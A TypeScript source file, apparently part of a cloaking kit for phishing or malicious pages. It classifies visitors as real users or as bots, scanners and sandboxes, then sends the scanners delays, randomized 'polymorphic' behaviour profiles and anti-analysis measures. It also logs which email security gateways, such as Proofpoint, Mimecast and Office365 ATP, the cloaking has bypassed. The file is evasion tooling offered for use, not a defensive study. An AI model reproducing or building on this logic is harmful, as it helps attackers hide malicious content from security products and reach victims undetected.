/**
 * APT INSTRUCTIONS INTERFACE
 * 
 * Lightweight instruction format for frontend
 * All heavy APT logic runs on backend, frontend only receives instructions
 */

export interface APTInstructions {
  // Timing instructions (micro-delays only, 10-40ms)
  delay: number // Micro-delay in ms (10-40ms for real users, 200-1200ms for bots)
  delayReason: string // Why delay was applied
  
  // Fingerprint instructions
  rotationRequired: boolean // Should frontend rotate fingerprint?
  rotationLevel?: 'low' | 'medium' | 'high' // How much to rotate
  
  // Behavior profile
  behaviorProfile: 'natural' | 'polymorphic-a' | 'polymorphic-b' | 'polymorphic-c'
  
  // Sandbox severity (0-1, where 0 = no threat, 1 = high threat)
  sandboxSeverity: number
  
  // Cloaking status
  cloakingActive: boolean
  cloakingLevel: 'low' | 'medium' | 'high' | 'enterprise' | 'apt'
  
  // Enterprise bypass status
  enterpriseBypassActive: boolean
  bypassedGateways: string[] // List of bypassed gateways (Proofpoint, Mimecast, etc.)
  
  // Threat assessment
  threatScore: number // 0-100
  isThreat: boolean
  
  // Instructions for frontend
  instructions: {
    applyMicroDelay: boolean // Apply 10-40ms delay
    showLoadingScreen: boolean // Show loading screen
    enableAntiAnalysis: boolean // Enable client-side anti-analysis (lightweight)
    enableBehaviorTracking: boolean // Track behavior for backend
  }
}

/**
 * Convert full APT evasion result to lightweight instructions
 * This is called on backend, returns minimal data for frontend
 */
export function generateAPTInstructions(
  aptResult: {
    evasionScore: number
    detectionRisk: number
    cloakingActive: boolean
    cloakingTechniques: string[]
    fingerprintRotated: boolean
    jitterApplied: boolean
    jitterDelay: number
  },
  threatScore: number,
  isThreat: boolean,
  sandboxSeverity: number,
  threatModel: 'low' | 'medium' | 'high' | 'enterprise' | 'apt'
): APTInstructions {
  // Determine if this is a bot/scanner (high threat = apply full delays)
  const isBotOrScanner = isThreat || threatScore >= 60 || sandboxSeverity > 0.5
  
  // Calculate delay: real users get 10-40ms, bots get 200-1200ms
  let delay = 0
  let delayReason = 'none'
  
  if (isBotOrScanner) {
    // Full APT jitter for bots/scanners
    delay = aptResult.jitterDelay || Math.floor(Math.random() * 1000) + 200 // 200-1200ms
    delayReason = 'bot-scanner-detected'
  } else {
    // Micro-delay for real users (10-40ms)
    delay = Math.floor(Math.random() * 30) + 10 // 10-40ms
    delayReason = 'micro-optimization'
  }
  
  // Determine behavior profile
  let behaviorProfile: 'natural' | 'polymorphic-a' | 'polymorphic-b' | 'polymorphic-c' = 'natural'
  if (isBotOrScanner && aptResult.cloakingActive) {
    const profiles = ['polymorphic-a', 'polymorphic-b', 'polymorphic-c']
    behaviorProfile = profiles[Math.floor(Math.random() * profiles.length)] as any
  }
  
  // Extract bypassed gateways from cloaking techniques
  const bypassedGateways: string[] = []
  aptResult.cloakingTechniques.forEach(tech => {
    if (tech.includes('proofpoint')) bypassedGateways.push('Proofpoint')
    if (tech.includes('mimecast')) bypassedGateways.push('Mimecast')
    if (tech.includes('barracuda')) bypassedGateways.push('Barracuda')
    if (tech.includes('cisco')) bypassedGateways.push('Cisco')
    if (tech.includes('trend')) bypassedGateways.push('Trend Micro')
    if (tech.includes('office365') || tech.includes('atp')) bypassedGateways.push('Office365 ATP')
  })
  
  return {
    delay,
    delayReason,
    rotationRequired: aptResult.fingerprintRotated,
    rotationLevel: threatModel === 'apt' ? 'high' : threatModel === 'enterprise' ? 'medium' : 'low',
    behaviorProfile,
    sandboxSeverity,
    cloakingActive: aptResult.cloakingActive,
    cloakingLevel: threatModel,
    enterpriseBypassActive: bypassedGateways.length > 0,
    bypassedGateways,
    threatScore,
    isThreat,
    instructions: {
      applyMicroDelay: !isBotOrScanner, // Only micro-delay for real users
      showLoadingScreen: isBotOrScanner, // Show loading for bots
      enableAntiAnalysis: isBotOrScanner && threatModel === 'apt', // Only for APT-level threats
      enableBehaviorTracking: true, // Always track for backend analysis
    },
  }
}


